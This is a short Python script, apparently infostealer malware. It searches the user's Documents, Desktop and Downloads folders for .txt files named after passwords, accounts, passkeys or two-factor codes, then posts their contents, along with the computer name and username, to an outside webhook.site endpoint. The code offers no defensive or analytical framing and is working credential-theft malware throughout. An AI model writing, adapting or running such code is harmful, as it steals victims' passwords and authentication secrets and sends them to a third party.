Contact_server = "https://webhook.site/"

from pathlib import Path
import os, re, requests
import datetime

def Data_Exfiltration(Form, Requested_Content):
    try:
        requests.post(
            Contact_server,
            json={f"[{Form}]": f"{datetime.datetime.now().strftime("%d-%h-%m")}/{datetime.datetime.now().strftime("%H:%M")}, {os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')} - {Requested_Content}"}, timeout=5)
    except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError) as requests_error:
        print(requests_error)

def File_Grabber():
    Check_for = ["passwords", "account", "information", "passkeys", "pass", "2fa", "two factor verification"]
    Paths = ["documents", "desktop", "downloads"]

    for Found_Paths in Paths:
        for files in Path(Path().home() / Found_Paths).iterdir():
            if re.search(f"({'|'.join(Check_for)})", files.name, re.IGNORECASE) and files.suffix == ".txt":
                try:
                    with open(files, "r", encoding="utf-8") as text_document:
                        Data_Exfiltration("text document", text_document.read())
                except Exception:
                    pass